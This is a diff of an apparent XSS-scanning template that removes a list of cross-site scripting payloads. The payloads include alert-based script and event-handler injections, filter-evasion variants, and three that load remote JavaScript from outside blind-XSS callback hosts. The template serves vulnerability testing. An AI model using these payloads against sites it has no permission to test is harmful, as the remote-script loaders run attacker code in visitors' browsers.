@@ -8,7 +8,7 @@ info:
 
 variables:
   first: "{{rand_int(10000, 99999)}}"
-  
+
 http:
   - method: GET
     path:
@@ -17,18 +17,6 @@ http:
     payloads:
       reflection:
         - "'\"><{{first}}"
-        - "<script>$.getScript("//satya.bxss.in")</script>"
-        - "<img src=x onerror=alert({{first}})>"
-        - "<script>alert({{first}})</script>"
-        - "'><ScRiPt>alert({{first}})</sCrIpT>"
-        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
-        - "</script><script>alert({{first}})</script>"
-        - "<body onload=alert({{first}})>"
-        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
-        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
-        - "\u0022\u003c%26quot;%26gt;%26lt;\"';}};“></SCRIPT><img src=x onerror=alert({{first}})>${{7*7}}"
-        - "</script><script src='https://satya.ez.pe'></script>"
-        - "<script src=//satya.ez.pe></script>"
 
     fuzzing:
       - part: query
